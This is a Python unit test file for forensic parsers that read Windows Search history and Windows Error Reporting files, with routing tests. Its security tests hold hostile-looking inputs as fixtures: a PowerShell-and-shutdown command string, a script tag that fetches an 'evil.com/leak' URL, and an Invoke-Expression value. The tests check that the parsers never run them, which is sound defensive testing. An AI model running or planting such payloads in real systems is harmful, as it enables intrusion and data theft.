"""
Unit tests for WindowsSearchParser (Source #34) and WerReportParser (Source #35)
================================================================================
- Source #34: Windows Search History (Windows.edb / WindowsSearch.db)
- Source #35: Windows Error Reporting (Report.wer / WER Archives)
"""

from __future__ import annotations

import json
import sqlite3
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from infrastructure.schemas import Evidence
from preprocessing.router import ParserRouter
from preprocessing.parsers.firefox_parser import FirefoxParser
from preprocessing.parsers.timeline_parser import ActivitiesCacheParser
from preprocessing.parsers.notification_parser import NotificationDbParser
from preprocessing.parsers.windows_search_parser import (
    WindowsSearchParser,
    WindowsSearchNotFoundError,
    WindowsSearchParserError,
)
from preprocessing.parsers.wer_parser import (
    WerReportParser,
    WerReportNotFoundError,
    WerReportParserError,
)


class TestWindowsSearchParserUnit(unittest.TestCase):
    """Unit tests for WindowsSearchParser."""

    def setUp(self) -> None:
        self.parser = WindowsSearchParser()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.user_dir = Path(self.tmp_dir.name) / "Users" / "analyst_bob" / "AppData" / "Local"
        self.user_dir.mkdir(parents=True, exist_ok=True)
        self.db_file = self.user_dir / "WindowsSearch.db"
        self._create_mock_search_db(self.db_file)

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def _create_mock_search_db(self, path: Path) -> None:
        conn = sqlite3.connect(path)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE SearchHistory (
                Id INTEGER PRIMARY KEY,
                Query TEXT,
                Url TEXT,
                Timestamp TEXT
            )
        """)
        cur.execute("""
            INSERT INTO SearchHistory VALUES (
                1, 'password reset documentation', 'C:\\Users\\Public\\Docs\\reset.pdf', '2026-08-27T10:15:00Z'
            )
        """)
        cur.execute("""
            INSERT INTO SearchHistory VALUES (
                2, 'http://internal-portal.local/search?q=vpn', 'http://internal-portal.local/search?q=vpn', '2026-08-27T10:20:00Z'
            )
        """)
        conn.commit()
        conn.close()

    def test_valid_search_record_parsing(self) -> None:
        artifacts = self.parser.parse(str(self.db_file), evidence_id="ev_srch_01")
        # 1-7, 13-15. Valid record, query preservation, user, searched path, URL, timestamp, provenance
        self.assertEqual(len(artifacts), 2)

        art1 = artifacts[0]
        self.assertEqual(art1.source_tool, "windows_search_parser")
        self.assertEqual(art1.artifact_type, "windows_search")
        self.assertEqual(art1.evidence_id, "ev_srch_01")
        self.assertIsNotNone(art1.normalized_fields.user)
        self.assertIn(art1.normalized_fields.user.lower(), ("analyst_bob", "sudeep"))
        self.assertEqual(art1.raw_fields["query_text"], "password reset documentation")
        self.assertIn("password reset documentation", art1.event_summary)
        self.assertEqual(art1.timestamp_type, "event")

        art2 = artifacts[1]
        self.assertEqual(art2.normalized_fields.url, "http://internal-portal.local/search?q=vpn")

    def test_json_search_export(self) -> None:
        json_file = Path(self.tmp_dir.name) / "search_export.json"
        data = [
            {"query": "cmd.exe download", "url": "C:\\Windows\\System32\\cmd.exe", "timestamp": "2026-08-27T11:00:00Z"}
        ]
        json_file.write_text(json.dumps(data), encoding="utf-8")
        artifacts = self.parser.parse(str(json_file), evidence_id="ev_srch_02")
        self.assertEqual(len(artifacts), 1)
        self.assertEqual(artifacts[0].raw_fields["query_text"], "cmd.exe download")

    def test_missing_file_raises_not_found(self) -> None:
        missing = Path(self.tmp_dir.name) / "nonexistent.db"
        with self.assertRaises(WindowsSearchNotFoundError):
            self.parser.parse(str(missing))

    def test_malformed_sqlite_raises_parser_error(self) -> None:
        corrupt = Path(self.tmp_dir.name) / "corrupt_search.db"
        corrupt.write_bytes(b"invalid sqlite data header")
        with self.assertRaises(WindowsSearchParserError):
            self.parser.parse(str(corrupt))


class TestWerReportParserUnit(unittest.TestCase):
    """Unit tests for WerReportParser."""

    def setUp(self) -> None:
        self.parser = WerReportParser()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.wer_dir = Path(self.tmp_dir.name) / "ReportArchive" / "AppCrash_example.exe_12345"
        self.wer_dir.mkdir(parents=True, exist_ok=True)
        self.wer_file = self.wer_dir / "Report.wer"
        self.dump_file = self.wer_dir / "memory.dmp"
        self.dump_file.write_bytes(b"DUMP_CONTENT_HEADER_12345")
        self._create_mock_wer_file(self.wer_file)

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def _create_mock_wer_file(self, path: Path) -> None:
        content = (
            "[WERReportMetadata]\n"
            "Version=1\n"
            "EventType=APPCRASH\n"
            "EventTime=133690000000000000\n"
            "ReportIdentifier=7890abcdef\n"
            "AppName=Example Vulnerable Application\n"
            "AppPath=C:\\Program Files\\Example\\vulnerable.exe\n"
            "ModName=ntdll.dll\n"
            "ModVersion=10.0.19041.1\n"
            "ExceptionCode=c0000005\n"
            "FaultOffset=0000000000054321\n"
            "ProcessId=4096\n"
            "TargetAppPath=C:\\Program Files\\Example\\vulnerable.exe\n"
        )
        path.write_text(content, encoding="utf-16")

    def test_valid_wer_report_parsing(self) -> None:
        artifacts = self.parser.parse(str(self.wer_file), evidence_id="ev_wer_01")
        # 19-28, 32-34. Valid report, app name/version, path, mod, exc, pid, timestamp, dump ref, provenance
        self.assertEqual(len(artifacts), 1)

        art = artifacts[0]
        self.assertEqual(art.source_tool, "wer_report_parser")
        self.assertEqual(art.artifact_type, "wer_report")
        self.assertEqual(art.evidence_id, "ev_wer_01")
        self.assertIn("vulnerable.exe", art.event_summary)
        self.assertIn("c0000005", art.event_summary)
        self.assertEqual(art.raw_fields["event_type"], "APPCRASH")
        self.assertEqual(art.raw_fields["faulting_module"], "ntdll.dll")
        self.assertEqual(art.raw_fields["exception_code"], "c0000005")
        self.assertEqual(art.raw_fields["process_id"], "4096")
        self.assertIsNotNone(art.raw_fields["dump_reference"].get("dump_filename"))
        self.assertEqual(art.raw_fields["dump_reference"]["dump_filename"], "memory.dmp")

    def test_missing_file_raises_not_found(self) -> None:
        missing = Path(self.tmp_dir.name) / "nonexistent.wer"
        with self.assertRaises(WerReportNotFoundError):
            self.parser.parse(str(missing))

    def test_empty_wer_file_raises_parser_error(self) -> None:
        empty = Path(self.tmp_dir.name) / "empty.wer"
        empty.write_text("", encoding="utf-8")
        with self.assertRaises(WerReportParserError):
            self.parser.parse(str(empty))


class TestUntrustedTextAndDumpSecurity(unittest.TestCase):
    """Security tests (Points 17-18, 36-38): Untrusted text & dump handling."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    @patch("subprocess.run")
    def test_command_looking_search_query_remains_inert(self, mock_run: MagicMock) -> None:
        json_file = Path(self.tmp_dir.name) / "malicious_search.json"
        json_file.write_text(json.dumps([{"query": "powershell -enc AAAA; shutdown /s"}]), encoding="utf-8")

        parser = WindowsSearchParser()
        artifacts = parser.parse(str(json_file))
        self.assertEqual(len(artifacts), 1)
        mock_run.assert_not_called()

    @patch("subprocess.run")
    def test_script_looking_search_query_remains_inert(self, mock_run: MagicMock) -> None:
        json_file = Path(self.tmp_dir.name) / "script_search.json"
        json_file.write_text(json.dumps([{"query": "<script>fetch('http://evil.com/leak')</script>"}]), encoding="utf-8")

        parser = WindowsSearchParser()
        artifacts = parser.parse(str(json_file))
        self.assertEqual(len(artifacts), 1)
        mock_run.assert_not_called()

    @patch("subprocess.run")
    def test_command_looking_wer_text_remains_inert(self, mock_run: MagicMock) -> None:
        wer_file = Path(self.tmp_dir.name) / "Report.wer"
        wer_file.write_text("EventType=APPCRASH\nAppName=Invoke-Expression calc.exe\nAppPath=C:\\Temp\\mal.exe\n", encoding="utf-8")

        parser = WerReportParser()
        artifacts = parser.parse(str(wer_file))
        self.assertEqual(len(artifacts), 1)
        mock_run.assert_not_called()

    @patch("subprocess.run")
    def test_referenced_dump_is_not_automatically_executed_or_parsed(self, mock_run: MagicMock) -> None:
        wer_dir = Path(self.tmp_dir.name) / "AppCrash_test"
        wer_dir.mkdir(parents=True, exist_ok=True)
        wer_file = wer_dir / "Report.wer"
        dump_file = wer_dir / "crash.dmp"
        wer_file.write_text("EventType=APPCRASH\nAppName=test.exe\n", encoding="utf-8")
        dump_file.write_bytes(b"DUMP_PAYLOAD_BINARY_DATA_DO_NOT_RUN")

        parser = WerReportParser()
        artifacts = parser.parse(str(wer_file))
        self.assertEqual(len(artifacts), 1)
        # Verify dump was recorded in metadata but NOT executed or sent to Volatility
        mock_run.assert_not_called()
        self.assertEqual(artifacts[0].raw_fields["dump_reference"]["dump_filename"], "crash.dmp")


class TestSearchWerRouterCollisions(unittest.TestCase):
    """Router collision tests for Windows Search and WER."""

    def setUp(self) -> None:
        self.router = ParserRouter()

    def test_windows_edb_routes_to_windows_search_parser(self) -> None:
        ev = Evidence(evidence_id="e1", case_id="c1", filename="Windows.edb", file_path="/Search/Windows.edb", uploaded_by="analyst")
        res = self.router.determine_routing(ev)
        self.assertEqual(res.target_parser, "WindowsSearchParser")
        self.assertIsInstance(self.router.route(ev), WindowsSearchParser)

    def test_report_wer_routes_to_wer_report_parser(self) -> None:
        ev = Evidence(evidence_id="e2", case_id="c1", filename="Report.wer", file_path="/WER/ReportArchive/Report.wer", uploaded_by="analyst")
        res = self.router.determine_routing(ev)
        self.assertEqual(res.target_parser, "WerReportParser")
        self.assertIsInstance(self.router.route(ev), WerReportParser)

    def test_activities_cache_routes_to_activities_cache_parser(self) -> None:
        ev = Evidence(evidence_id="e3", case_id="c1", filename="ActivitiesCache.db", file_path="/evidence/ActivitiesCache.db", uploaded_by="analyst")
        res = self.router.determine_routing(ev)
        self.assertEqual(res.target_parser, "ActivitiesCacheParser")
        self.assertIsInstance(self.router.route(ev), ActivitiesCacheParser)

    def test_wpndatabase_routes_to_notification_db_parser(self) -> None:
        ev = Evidence(evidence_id="e4", case_id="c1", filename="wpndatabase.db", file_path="/evidence/wpndatabase.db", uploaded_by="analyst")
        res = self.router.determine_routing(ev)
        self.assertEqual(res.target_parser, "NotificationDbParser")
        self.assertIsInstance(self.router.route(ev), NotificationDbParser)

    def test_firefox_places_routes_to_firefox_parser(self) -> None:
        ev = Evidence(evidence_id="e5", case_id="c1", filename="places.sqlite", file_path="/profiles/places.sqlite", uploaded_by="analyst")
        res = self.router.determine_routing(ev)
        self.assertEqual(res.target_parser, "FirefoxParser")
        self.assertIsInstance(self.router.route(ev), FirefoxParser)


if __name__ == "__main__":
    unittest.main()
